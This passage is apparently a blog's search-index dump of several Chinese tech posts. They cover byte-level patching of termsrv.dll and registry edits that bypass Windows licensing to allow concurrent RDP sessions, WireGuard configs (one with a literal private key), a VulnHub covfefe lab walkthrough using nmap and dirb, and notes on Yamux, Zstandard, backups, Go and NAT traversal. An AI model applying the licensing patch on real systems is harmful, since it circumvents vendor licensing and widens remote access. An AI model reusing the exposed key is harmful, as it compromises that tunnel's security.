termsrv.dll文件对应的函数接口。\n附：修改位置查找方法 需要使用 IDA 对 termsrv.dll文件进行分析，找到修改的位置和修改的内容。\n使用 IDA 打开 termsrv.dll， ，找到 Header 值位置 180000000。\n✨Hook程序修改位置1：LocalOnlyPatch 函数：CEnforcementCore::GetInstanceOfTSLicense(_GUID \u0026amp;,ITSLicense * *)\n该函数主要会对本地的 License 进行判断，需要让该函数不进行判断直接进行跳转。\n修改内容：\n需要将该函数此处的比较跳转（JZ）修改为直接跳转（JMP）：\n修改前：\n.text:0000000180087611 jz short loc_180087657\t// 74 44 修改后：\n.text:0000000180087611 jmp short loc_180087657\t// EB 44 偏移量：180087611 - 180000000 = 87611\n✨Hook程序修改位置2：SingleUserPatch 函数：CSessionArbitrationHelperMgr::IsSingleSessionPerUserEnabled(int *)\n该函数会判断当前主机是否只允许单用户进行会话连接，需要让该函数判断为允许多用户连接。\n修改内容：\n需要将此处传入值 1 修改为 0： 修改前：\n.text:000000018000BFE0 mov dword ptr [rdx], 1\t// C7 02 00 00 00 00 修改后：\n.text:000000018000BFE0 mov dword ptr [rdx], 0\t// C7 02 01 00 00 00 偏移量：0BFE2\n✨Hook程序修改位置3：DefPolicyPatch 函数：CDefPolicy::Query(int *)\n该函数主要作用是设置最大远程连接数，这里让最大连接数设置为最大值（256）即可。\n修改内容：\n需要将修改此处的比较、跳转语句修改为直接重设寄存器值语句：\n修改前：\n此处根据具体比较的寄存器和执行的跳转语句执行不同的预设语句\n.text:0000000180017ED5 cmp [rcx+63Ch], eax\t\\\\ 39 81 3C 06 00 00 .text:0000000180017EDB jz loc_18002D0BA\t\\\\ 0F 84 D9\t51 01 00 修改后：\n.text:0000000180017ED5 mov eax, 100h\t\\\\ B8 00 01 00 00 .text:0000000180017EDA mov [rcx+638h], eax\t\\\\ 89 81 38 06 00 00 .text:0000000180017EE0 nop\t\\\\ 90 偏移量：17ED5\n✨Hook程序修改位置4：SLInitHook 函数：CSLQuery::Initialize(void)\n修改内容：\n通过全局关键字搜索找到该函数变量的存放区域：\n变量的值需要重设为：\nbServerSku = 1 bRemoteConnAllowed = 1 bFUSEnabled = 1 bAppServerAllowed = 1 bMultimonAllowed = 1 lMaxUserSessions = 0 ulMaxDebugSessions = 0 bInitialized = 1 各变量的偏移量：\nbInitialized.x64 =103FF8 bServerSku.x64 =103FFC lMaxUserSessions.x64 =104000 bAppServerAllowed.x64 =104008 bRemoteConnAllowed.x64=104010 bMultimonAllowed.x64 =104014 ulMaxDebugSessions.x64=104018 bFUSEnabled.x64 =10401C 3、配置windows 远程注册表配置项 1. ServiceDll 服务端会根据该值查找处理 RDP 远程连接的 dll 库文件，我们需要将其替换为 Hook 的 dll 文件。\n位置：Computer\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\TermService\\Parameters -\u0026gt; ServiceDll\n原始值：%SystemRoot%\\System32\\termsrv.dll\n替换值：{{rdpwrap.dll文件 所在路径}}\n2. fDenyTSConnections 该值控制主机是否开启 Windows 远程桌面服务。true关闭远程服务，false开启远程服务。\n位置：Computer\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server -\u0026gt; fDenyTSConnections\n3. EnableConcurrentSessions 该值会管理主机是否允许多个用户远程登录并同时使用服务器。true开启并发会话，false关闭并发会话。\n位置：\nComputer\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Licensing Core -\u0026gt; EnableConcurrentSessions\n4. AllowMultipleTSSessions 该值控制主机是否允许多终端服务会话。true允许多用户，false不允许多用户。\n位置：Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon -\u0026gt; AllowMultipleTSSessions\n5. AddIns 位置：\n配置剪贴板和客户端端口的重定向器。\nClip Redirector：\n剪切板重定向器。\n位置：Computer\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\AddIns\\Clip Redirector DND Redirector：\nRDP 展示程序。\n位置：Computer\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\AddIns\\DND Redirector Dynamic VC：\nDynamic Virtual Channel。\n位置：Computer\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\AddIns\\Dynamic VC 4、补全缺失的依赖程序 由于开启多用户能力后，相较于某些系统版本（家庭版），缺少部分远程桌面使用的文件，需要在对应的位置配置文件的拷贝，让远程桌面能力能完整对外服务\n1. rdpclip.exe 该程序用于剪切板重定向，用于同步客户端和服务端的剪切板。\n位置：%SystemRoot%\\System32\\rdpclip.exe\n2. rfxvmt.dll 该动态库包含远程桌面服务端程序。\n位置：%SystemRoot%\\System32\\rfxvmt.dll\n操作流程总结 提取所需文件，包括：rdpclip.exe(存在则不管)、rfxvmt.dll(存在则不管)和rdpwrap.dll(Hook 程序，必须放在系统级目录下，不可放在用户目录内，这里选择路径为C:\\Program Files\\Test\\rdpwrap.dll)；\n修改 ServiceDll注册表的值，将其替换为 Hook 程序的路径(C:\\Program Files\\Test\\rdpwrap.dll)；\n修改注册表的值，正确配置远程桌面服务；\n开启防火墙 3389 端口；\n杀死 TermService 服务的进程；\n启动 TermService 服务，服务启动后会根据 ServiceDll的值加载 rdpwrap.dll程序，rdowrap.dll 程序则会去 Hook termsrv.dll文件（如果在Windows 服务管理中 TermService 服务配置为自动，那么可以不用手动重启，Windows 会自动重启该服务 )。\n二、开启单用户多会话模式 通过上一个步骤已经实现了多用户同时访问，但是每一个用户都只能存在一个会话连接，后建立的会话连接会挤掉先建立的会话连接。如果需要将主机上的应用共享给多个用户使用则必须要新建多个用户。\n当开启了单用户多会话模式后，单个用户就可以建立多个会话连接，多个使用者可以通过同一个用户身份进行访问应用。\n通过修改下列注册表配置项可以开启单用户多会话模式。\nfSingleSessionPerUser\n开启单用户多会话模式。true代表关闭单用户多会话模式，false代表开启单用户多会话模式。\n位置：Computer\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server -\u0026gt; fSingleSessionPerUser\nC:\\Windows\\System32\\lusrmgr.msc\n三、发布Remote App 应用 Windows 远程桌面支持发布单个应用。可以通过修改配置表的方式选择需要发布的应用。\n按下 Win + R 键，输入 regedit 进入注册表编辑，找到 Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Terminal Server\\TSAppAllowList，新建项(K)Applications：\n这个Applications就是我们允许远程访问 App 的白名单。\n下面演示添加一个测试应用：\n在 Applications 下面新建一个项(K)，取名为 Test 为该项添加一个 字符串值 ，名字为Path，其值为 C:\\Windows\\explorer.exe(Windows 资源管理器)： 重启主机，使相关配置项生效。 Windows 服务端更多配置项可查看官方文档：Search | Microsoft Docs\n四、新建远程访问用户 首先新建一个用户：Settings -\u0026gt; Accounts -\u0026gt; Family \u0026amp; other users -\u0026gt; Add someone else to this PC\n然后为新建的用户添加远程桌面权限：Settings -\u0026gt; System -\u0026gt; Remote Desktop -\u0026gt; User accounts -\u0026gt; Select users that can remotely access this PC\n五、客户端连接 相关配置项分析 当客户端与服务端建立远程连接时，客户端的remoteapplicationprogram:s可以传递别名或者绝对路径。\n别名\n当客户端传递别名时，服务端会去Applications去匹配别名，匹配失败则拒绝建立连接；匹配成功会根据匹配的项的 Path项的路径去打开指定文件，打开成功则建立连接，打开失败则拒绝建立连接。\n绝对路径\n当客户端传递的是绝对路径时，服务端会首先检查Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Terminal Server\\TSAppAllowList 的 fDisabledAllowList字段，该字段的值有以下两种：\nValue Description 0 Specifies that the Allow list is checked and enforced. This is the default setting. 1 Specifies that the Allow list is not checked and enforced. 当fDisabledAllowList值为1时，服务端会直接根据客户端传递的绝对路径尝试打开应用建立连接；\n为 0 时，客户端进行远程连接时，服务端将客户端传递的绝对路径与 Applications目录下的项的Path匹配，如果匹配成功，则允许进行访问；如果不成功，则禁止访问。\n客户端rdpfile \u0026ndash;\u0026gt; remoteapplicationprogram remote server reg \u0026ndash;\u0026gt; TSAppAllowList fDisabledAllowList 连通结果 别名A 有配置为别名A的启动路径 1 ok 别名A 有配置为别名A的启动路径 0 ok 别名A 无配置为别名A的启动路径 1 failed 别名A 无配置为别名A的启动路径 0 failed 指定程序绝对路径 所有配置项中 包含 客户端rdp file钟指定的启动路径 0 ok 指定程序绝对路径 所有配置项中 包含 客户端rdp file钟指定的启动路径 1 ok 指定程序绝对路径 所有配置项中 不包含 客户端rdp file钟指定的启动路径 1 ok 指定程序绝对路径 所有配置项中 不包含 客户端rdp file钟指定的启动路径 0 failed 客户端 RDP 配置文件中的 disableremoteappcapscheck在置为1时，会在建立连接之前检查服务端是否对当前应用进行禁用；当值为 0 时会在建立连接之后再进行检查（一般情况下为 1 时的用户体验要好很多）。\nRDP 文件编写 新建一个文本，写入以下配置文件：\nallow desktop composition:i:1 allow font smoothing:i:1\talternate full address:s:DESKTOP // 指定远程计算机的备用名称或IP地址 alternate shell:s:rdpinit.exe devicestoredirect:s:*\t// 确定本地计算机上的哪些设备将被重定向并在远程会话中可用; * 代表重定向所有受支持的设备，包括稍后连接的设备 disableremoteappcapscheck:i:1\t// 提前检查远程 APP在服务端是否允许访问 drivestoredirect:s:* full address:s:10.0.*.*\t// 指定要连接到的远程计算机的名称或IP地址 prompt for credentials on client:i:1 promptcredentialonce:i:0 redirectcomports:i:1 redirectdrives:i:1 remoteapplicationmode:i:1\t// 连接是否作为RemoteApp会话启动 remoteapplicationname:s:Test\t// 客户端界面中指定RemoteApp的名称 remoteapplicationprogram:s:||Test\t// RemoteApp的别名或绝对路径(加||代表使用别名)。别名指的是 Applications 下的项名 保存该文本为 TestApp.rdp，更多配置项可查看官方文档：Supported Remote Desktop RDP file settings | Microsoft Docs\n六、访问远程应用 将上一步中编写的 rdp 文件复制到客户端，如果是 Windows 客户端则可以直接双击打开，如果非 Windows 端需要安装 WIndows 远程桌面客户端。\n双击打开，输入新建的用户名和密码，就可以使用服务端的远程应用了： ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/windows-%E4%B8%AA%E4%BA%BA%E5%BA%94%E7%94%A8%E5%85%B1%E4%BA%AB/","title":"WIndows 个人应用共享"},{"content":"Wireguard 实践 一、安装 Ubuntu ⚠️ 注意 ：\nWireGuard 对 Linux 内核版本有要求，5.4 以上内核才将其纳入其中。 如果内核低于该版本（典型如：RHEL 和 CentOS），就需要比较复杂的涉及内核编译的过程，请自行登录 官网 查找详细信息。\n1 $ sudo apt install wireguard 安装完成后系统中会存在以下东西：\n两个 cli 命令：wg 和 wg-quick; 两个 systemd 文件: wg-quick@.service 和 wg-quick.target. 可以在 WireGuard 的 Service 文件中加入如下一行，重新加载配置流量不中断： ExecReload=/bin/bash -c 'exec /usr/bin/wg syncconf %i \u0026lt;(exec /usr/bin/wg-quick strip %i)'\nWindows 下载链接\nWindows 下载完成后，会存在一个后台服务和一个 GUI 的界面\nAndroid Google Store 下载链接\n二、使用实践 1. Peer to Peer 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 # 安装 wireguard apt install wireguard # 进入文件夹 cd /etc/wireguard # 修改文件夹权限 umask 077 # 生成服务端公私钥 wg genkey | tee server_privatekey | wg pubkey \u0026gt; server_publickey # 生成客户端公私钥 wg genkey | tee client_privatekey | wg pubkey \u0026gt; client_publickey # 生成服务端配置文件 echo \u0026#34;[Interface] PrivateKey = $(cat server_privatekey) # 填写本机的privatekey 内容 Address = 192.168.199.1/24 PostUp = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -A FORWARD -o $(ip r | grep default | awk \u0026#39;{print $5}\u0026#39;) -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE PostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -D FORWARD -o $(ip r | grep default | awk \u0026#39;{print $5}\u0026#39;) -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE ListenPort = 12345 # 注意该端口是UDP端口 DNS = 8.8.8.8 MTU = 1420 [Peer] PublicKey = $(cat client_publickey) # 填写对端的publickey 内容 AllowedIPs = 192.168.199.2/24 \u0026#34; \u0026gt; wg0.conf # 启动网卡 wg-quick up wg0 # 加入开机自启动 systemctl enable wg-quick@wg0.service # 生成客户端配置文件 echo \u0026#34;[Interface] PrivateKey = $(cat client_privatekey) # 填写客户端的privatekey 内容 Address = 192.168.199.2/32 DNS = 8.8.8.8 MTU = 1420 [Peer] PublicKey = $(cat server_publickey) # 填写对端的publickey 内容 Endpoint = $(ip a | grep $(ip r | grep default | awk \u0026#39;{print $5}\u0026#39;) | grep inet | awk \u0026#39;{print $2}\u0026#39; | cut -d\u0026#39;/\u0026#39; -f 1):12345 # 对端地址 AllowedIPs = 192.168.199.1/24 PersistentKeepalive = 25 \u0026#34; \u0026gt; client.conf # 为了方便使用，可以生成二维码 apt install qrencode qrencode -t ansiutf8 \u0026lt; client.conf # 客户端导入配置即可连接到服务端 2. Peer to LAN 1 2 3 4 5 # LAN 中的机器 # 开启 ip 报文转发 echo \u0026#34;net.ipv4.ip_forward = 1\u0026#34; \u0026gt;\u0026gt; /etc/sysctl.conf echo \u0026#34;net.ipv4.conf.all.proxy_arp = 1\u0026#34; \u0026gt;\u0026gt; /etc/sysctl.conf sysctl -p /etc/sysctl.conf 1 2 3 4 5 6 7 8 9 10 11 12 13 14 # 拥有公网 IP 的机器 # 配置 [Interface] Address = 172.30.66.1/32 ListenPort = 12345 PrivateKey = GFw4BUsqlZFxBDdbGy64gATQtC6VfeCc820XRZpfLWs= PostUp = iptables -t nat -A POSTROUTING -o %i -j MASQUERADE PostDown = iptables -t nat -D POSTROUTING -o %i -j MASQUERADE [Peer] PublicKey = l6ZuOCtYWCvW4o2o1QIZ1W4kGGCErVt3ERdzyxwJ9h8= AllowedIPs = 172.30.66.12/32,10.113.0.0/16, 10.20.0.0/16, 10.50.0.0/16, 192.168.80.0/24, 192.168.3.0/24, 192.168.8.0/24, 192.168.10.0/24, 192.168.12.0/24, 192.168.24.0/24, 192.168.25.0/24, 192.168.26.0/24, 192.168.27.0/24, 192.168.30.0/24, 192.168.32.0/24 PersistentKeepalive = 5 3. LAN to LAN 与 \u0026ldquo;Peer to LAN\u0026rdquo; 类似，双端都开放网段，即可打通两个 LAN.\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/wireguard-%E5%AE%9E%E8%B7%B5/","title":"Wireguard 实践"},{"content":"Yamux 多路复用流程分析文档 简介 Yamux (Yet Another Multiplexer) 是一个 Golang 实现的多路复用库。它在底层连接（如 TCP 或 Unix 域套接字）之上提供流式多路复用功能，旨在优化网络资源利用率，提高连接效率和性能。它类似于 SPDY，但不与之兼容。Yamux 允许在一个单一的连接上同时传输多个逻辑流（Streams）。\n多路复用流程 1. 连接建立 首先，客户端和服务端通过底层连接（如 TCP）建立连接。这个连接提供可靠性和顺序性，是多路复用的基础。\n流程图：\nflowchart TD A[客户端] --\u0026gt;|建立TCP连接| B[服务端] 2. Yamux Session 初始化 客户端：通过 yamux.Client(conn, nil) 初始化 Yamux 会话，conn 是与服务端的底层连接。 服务端：通过 yamux.Server(conn, nil) 初始化 Yamux 会话，conn 是接受到的客户端连接。 流程图：\nflowchart TD A[客户端] --\u0026gt;|建立TCP连接| B[服务端] A --\u0026gt; C[初始化 Yamux Client 会话] B --\u0026gt; D[初始化 Yamux Server 会话] 3. 创建和管理流（Streams） 主动打开流：\n客户端或服务端可以主动通过 session.Open() 打开一个新的流。流一旦打开，就可以用于双向通信。 被动接受流：\n服务端可以使用 session.Accept() 来等待和接受客户端打开的流。 流程图：\nflowchart TD A[客户端] --\u0026gt;|建立TCP连接| B[服务端] A --\u0026gt; C[初始化 Yamux Client 会话] B --\u0026gt; D[初始化 Yamux Server 会话] C --\u0026gt; E{主动打开流?} E --\u0026gt;|是 | F[通过 session.Open 打开流] E --\u0026gt;|否| G[等待服务端接受流] D --\u0026gt; H[通过 session.Accept 接受流] 4. 流上的通信 一旦流被创建，客户端和服务端就可以通过这个流进行数据交换。流支持双向通信，意味着任一方都可以发送和接收数据。\n流程图：\nflowchart TD A[客户端] --\u0026gt;|建立TCP连接| B[服务端] A --\u0026gt; C[初始化 Yamux Client 会话] B --\u0026gt; D[初始化 Yamux Server 会话] C --\u0026gt; E{主动打开流?} E --\u0026gt;|是| F[通过 session.Open 打开流] E --\u0026gt;|否| G[等待服务端接受流] D --\u0026gt; H[通过 session.Accept 接受流] F --\u0026gt; I[数据交换] G --\u0026gt; I H --\u0026gt; I 5. 流的关闭 主动关闭流：任一方可以选择关闭流，结束流上的通信。 自动关闭：当所有的流都关闭时，Yamux 会话也会关闭。 流程图：\nflowchart TD A[客户端] --\u0026gt;|建立TCP连接| B[服务端] A --\u0026gt; C[初始化 Yamux Client 会话] B --\u0026gt; D[初始化 Yamux Server 会话] C --\u0026gt; E{主动打开流?} E --\u0026gt;|是| F[通过 session.Open 打开流] E --\u0026gt;|否| G[等待服务端接受流] D --\u0026gt; H[通过 session.Accept 接受流] F --\u0026gt; I[数据交换] G --\u0026gt; I H --\u0026gt; I I --\u0026gt; J{通信完成或错误?} J --\u0026gt;|是| K[关闭流] J --\u0026gt;|否| I K --\u0026gt; L{所有流关闭?} L --\u0026gt;|是| M[关闭 Yamux 会话] L --\u0026gt;|否| K 6. 流控制和保持活跃 流控制：Yamux 提供了流控制机制，避免一个流占据所有带宽，确保公平性。 保持活跃：通过发送心跳包，保持连接的活跃状态，适用于通过负载均衡器的持久连接。 完整流程图 flowchart TD A[客户端] --\u0026gt;|建立TCP连接| B[服务端] A --\u0026gt; C[初始化 Yamux Client 会话] B --\u0026gt; D[初始化 Yamux Server 会话] C --\u0026gt; E{主动打开流?} E --\u0026gt;|是| F[通过 session.Open 打开流] E --\u0026gt;|否| G[等待服务端接受流] D --\u0026gt; H[通过 session.Accept 接受流] F --\u0026gt; I[数据交换] G --\u0026gt; I H --\u0026gt; I I --\u0026gt; J{通信完成或错误?} J --\u0026gt;|是| K[关闭流] J --\u0026gt;|否| I K --\u0026gt; L{所有流关闭?} L --\u0026gt;|是| M[关闭 Yamux 会话] L --\u0026gt;|否| K 理解流程 多路复用：可以想象成在一条高速公路上，允许多辆车（流）同时行驶，而不是让每辆车单独占用整条道路。\nYamux 会话：就像是公路管理中心，负责管理和调度所有车辆（流）的行驶。\n流的创建：就像是开通一条新的车道，允许车辆（数据）在这个车道上行驶。\n流上的通信：车辆（数据）在车道（流）上行驶，双方可以互相传递消息。\n流的关闭：车道关闭，车辆不再在这条车道上行驶。\n通过 Yamux，网络通信变得更加高效，允许在单一连接上同时处理多个逻辑流，减少连接的开销，提高网络利用率。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/yamux-%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/","title":"yamux 流程分析"},{"content":"Zstandard 压缩算法 简介 Zstandard 是 Facebook 在 2016年开源的无损压缩算法，优点是压缩率和解压缩性能都很好。官方库地址：https://github.com/facebook/zstd\nLinux内核、HTTP协议、以及一系列的大数据工具（包括Hadoop 3.0.0，HBase 2.0.0，Spark 2.3.0，Kafka 2.1.0）等都已经加入了对zstd的支持。\n使用 在 Go 中使用 zstd，有两个库推介：\ngithub.com/klauspost/compress/zstd：这是一个纯 Go 实现的 zstd 算法； github.com/valyala/gozstd：这是一个基于 CGO 实现的 zstd 算法。 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/zstandard-%E5%8E%8B%E7%BC%A9%E7%AE%97%E6%B3%95/","title":"Zstandard 压缩算法"},{"content":"靶机渗透：coyfefe 0x00：靶机安装与启动 靶机地址：covfefe: 1 ~ VulnHub\n在 VM 上安装好靶机后，将靶机与攻击机配置到同一局域网内，启动靶机：\n0x01：渗透过程 1. 搜索靶机地址 首先使用 netdiscover 工具找到靶机 IP 地址：\nsudo netdiscover -r 192.168.1.0/24 Output: Currently scanning: Finished! | Screen View: Unique Hosts 286 Captured ARP Req/Rep packets, from 7 hosts. Total size: 17160 _____________________________________________________________________________ IP At MAC Address Count Len MAC Vendor / Hostname ----------------------------------------------------------------------------- 192.168.1.1 bc:54:fc:2c:60:2c 230 13800 SHENZHEN MERCURY COMMUNICATION TECHNOLOGIES CO.,LTD. 192.168.1.105 00:0c:29:38:64:81 40 2400 VMware, Inc. 找到靶机地址为：192.168.1.105；\n2. 扫描靶机开放端口 使用 namp 扫描靶机开放端口：\nnmap -sV 192.168.1.105 output: PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10 (protocol 2.0) 80/tcp open http nginx 1.10.3 31337/tcp open http Werkzeug httpd 0.11.15 (Python 3.5.3) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 通过 nmap 的扫描我们发现靶机开启了两个 http 的服务端口和一个 ssh 的服务端口。\n3. http 目录扫描 接下来我们使用 dirb 工具对靶机进行目录和文件扫描，看看有没有什么有用的信息：\ndirb http://192.168.1.105:80/ output： ---- Scanning URL: http://192.168.1.105:80/ ---- ----------------- dirb http://192.168.1.105:31337/ output： ---- Scanning URL: http://192.168.1.105:31337/ ---- + http://192.168.1.105:31337/.bash_history (CODE:200|SIZE:19) + http://192.168.1.105:31337/.bashrc (CODE:200|SIZE:3526) + http://192.168.1.105:31337/.profile (CODE:200|SIZE:675) + http://192.168.1.105:31337/.ssh (CODE:200|SIZE:43) + http://192.168.1.105:31337/robots.txt (CODE:200|SIZE:70) ----------------- 对两个端口进行扫描，我们发现在 31337 端口的 web 目录下存在几个敏感文件。\n4. robots.txt robots.txt是一个协议，而不是一个命令。robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。\nrobots.txt 是我们渗透测试人员重点的查看对象，因为在这个文件下很有可能写有网站的敏感目录或者文件。\n浏览器访问：http://192.168.1.105:31337/robots.txt，发现有如下内容：\nUser-agent: * Disallow: /.bashrc Disallow: /.profile Disallow: /taxes 我们在 robots.txt 目录下发现了一个隐藏目录：taxes，浏览器访问这个隐藏目录：http://192.168.1.105:31337/taxes/\n发现如下内容，很幸运我们发现了第一个 flag：\nGood job! Here is a flag: flag1{make_america_great_again} ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fcoyfefe/","title":"靶机渗透：coyfefe"},{"content":" 2022/01/13 晚\n备份的重要性 事故发生 今天下午在 push 代码时，突然发现代码 push 不上去，打开 gitlab 一看，代码仓库居然变成了十月份的样子。赶紧给网管说了这个现象。\n网管一看 Gitlab 就发现大事不妙，赶紧打开 Astack 后台，准备恢复 gitlab 服务器的快照（写了定时任务每天对服务器做快照）。打开服务器快照仓库一看，这下真的凉了——快照仓库只剩下十月份的快照了。\n解决方案 网管赶紧把这个问题汇报给了领导，领导气得直说：“这他妈不是扯淡呢吗？竟然会出现这种问题！！这个属于是重大生产事故了！！！”。既然事情已经发生了那就只能想解决办法了，于是乎领导紧急召开了会议，做了如下安排：\n将当前虚拟机做打包备份迁移，不能将最后这点数据也丢失了； 对 gitlab 数据进行备份迁移，确保当前仓库数据能够保留； 上面的步骤做完保证当前留存的数据保存完善后再查找故障原因，查看到底是什么问题导致的此次事故； 查看各代码仓库本地缓存数据，统计最坏损失情况。 会议开完后大家就开始忙活了。。。\n忙活了一下午现在已经完成了部分：\n统计了代码仓库损失，有两个文档仓库本地没有缓存，其余的代码仓库本地都有完整数据； gitlab 和 当前虚拟机都已经打包并保证当前数据完整保留了； 查找到了事故原因。 事故原因 经过排查发现是网管创建的快照任务的问题：\n每日快照备份的任务在十月份时就已经出了问题，但是一直没有去管这个问题； 今天有人直接对物理主机进行了关电操作，云平台检测到异常于是选择对虚拟机进行恢复上一次快照处理； 仓库里面只有十月份的快照，于是虚拟机恢复到了十月份的状态。 反思 本次事故仅仅只是我们组内的仓库出现了问题，大家本地也都还有代码仓库数据，因此造成的影响不大。但是我们必须对本次事故进行反思，防止下一次再出现此次状况：\n重要数据及时做好备份，备份手段不能单一化，备份存储地点不能单一化，应当保证备份数据的安全； 定期检查备份安全状况，不能完全依赖于自动化程序，重要数据应当手动确认； 机房属于极为重要的地方，任何人员的操作都应当被记录，否则会出现事故时无法进行追责处理； 快照不应当作为数据备份的方式； 数据丢失后，应当首先保护现场，保证当前状态备份完成再进行处理，防止二次破坏； 事故发生后第一时间应当做周密的安排对事故进行处理，在对事故处理好后再考虑追责等事情。 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E5%A4%87%E4%BB%BD%E7%9A%84%E9%87%8D%E8%A6%81%E6%80%A7/","title":"备份的重要性"},{"content":"比较骚的一些代码 操作系统表情包 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 func osEmoji(os string) string { switch os { case \u0026#34;linux\u0026#34;: return \u0026#34;🐧\u0026#34; case \u0026#34;macOS\u0026#34;: return \u0026#34;🍎\u0026#34; case \u0026#34;windows\u0026#34;: return \u0026#34;🖥️\u0026#34; case \u0026#34;iOS\u0026#34;: return \u0026#34;📱\u0026#34; case \u0026#34;android\u0026#34;: return \u0026#34;🤖\u0026#34; case \u0026#34;freebsd\u0026#34;: return \u0026#34;👿\u0026#34; case \u0026#34;openbsd\u0026#34;: return \u0026#34;🐡\u0026#34; } return \u0026#34;👽\u0026#34; } 文件自动重命名 1 2 3 for i := 1; gfile.Exists(dst); i++ { dst = gfile.Join(dir, fmt.Sprintf(fmt.Sprintf(\u0026#34;%s(%d)%s\u0026#34;, gfile.Name(in.File.Filename), i, gfile.Ext(in.File.Filename)))) } 编译环境检查 1 2 3 4 5 //go:build go1.21 package qtls var _ int = \u0026#34;The version of quic-go you\u0026#39;re using can\u0026#39;t be built on Go 1.21 yet. For more details, please see https://github.com/quic-go/quic-go/wiki/quic-go-and-Go-versions.\u0026#34; 函数定义 1 2 3 4 5 6 7 8 9 type st struct{} func (s *st) name(string) {} var ( handles = []func(*st, string){ (*st).name, } ) 嵌套取值 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 package main import ( \u0026#34;fmt\u0026#34; ) type I1 interface { Name() string } type T1 struct{} func (t *T1) Name() string { return \u0026#34;t1\u0026#34; } func (t *T1) Age() int { return 18 } type T2 struct { I1 } func (t *T2) Name() string { return t.I1.Name() + \u0026#34; t2\u0026#34; } func Fn(t I1) { fmt.Println(t.Name()) fmt.Println(t.(*T2).I1.(*T1).Age()) } func main() { t1 := \u0026amp;T1{} t2 := \u0026amp;T2{I1: t1} Fn(t2) } 字符串 \u0026lt;-\u0026gt; []byte 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package util import ( \u0026#34;unsafe\u0026#34; ) // BytesToString converts byte slice to string. func BytesToString(b []byte) string { return *(*string)(unsafe.Pointer(\u0026amp;b)) } // StringToBytes converts string to byte slice. func StringToBytes(s string) []byte { return *(*[]byte)(unsafe.Pointer( \u0026amp;struct { string Cap int }{s, len(s)}, )) } 切片截取性能优化 1 2 // 性能优于 buf1 := buf[:length] buf1 := buf[:uint32(length)] ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E6%AF%94%E8%BE%83%E9%AA%9A%E7%9A%84%E4%B8%80%E4%BA%9B%E4%BB%A3%E7%A0%81/","title":"比较骚的一些代码"},{"content":"不同网络模型下建立 P2P 连接 一、公网 - 公网 在当前网络模型中，客户端 A 和客户端 B 都位于公网。客户端 A 和 客户端 B 通过以下步骤即可建立 P2P 连接：\n客户端 A 向中心服务器上报自身信息，并获取客户端 B 信息；客户端 B 向中心服务器上报自身信息，并获取客户端 A 信息；（PS： 忽略两端获取对端信息时的时间差） 客户端 A 根据从中心服务器获取的信息发现 B 具有公网地址，于是 A 直接向 B 发起连接；（PS： 可以互换连接顺序） 客户端 B 根据从中心服务器获取的信息发现 A 具有公网地址，因此 B 等待 A 进行连接； 二、NAT - 公网 在当前网络模型中，客户端 B 位于公网，有公网 IP，客户端 A 位于任意 NAT 后。客户端 A 和 客户端 B 通过以下步骤即可建立 P2P 连接：\n客户端 A 向中心服务器上报自身信息，并获取客户端 B 信息；客户端 B 向中心服务器上报自身信息，并获取客户端 A 信息；（PS： 忽略两端获取对端信息时的时间差） 客户端 B 根据从中心服务器获取的信息发现 A 位于 NAT 后，因此 B 等待 A 进行连接； 客户端 A 根据从中心服务器获取的信息发现 B 位于公网，于是 A 直接向 B 发起连接； 三、客户端位于同一NAT后 在当前网络模型中，客户端 A 和客户端 B 位于同一任意 NAT 后。客户端 A 和 客户端 B 通过以下步骤即可建立 P2P 连接：\n客户端 A 向中心服务器上报自身信息，并获取客户端 B 信息；客户端 B 向中心服务器上报自身信息，并获取客户端 A 信息；（PS： 忽略两端获取对端信息时的时间差） 客户端 A 根据从中心服务器获取的信息发现 B 的公网地址和自身相同，猜测 B 可能与自己位于同一内网中，于是 A 尝试直接向 B 发起连接；（PS： 可以互换连接顺序） 客户端 B 根据从中心服务器获取的信息发现 A 的公网地址和自身相同，猜测 A 可能与自己位于同一内网中，因此 B 等待 A 进行连接； 四、客户端分属与不同NAT下 在当前网络模型中，客户端 A 和客户端 B 都位于 NAT 后。客户端 A 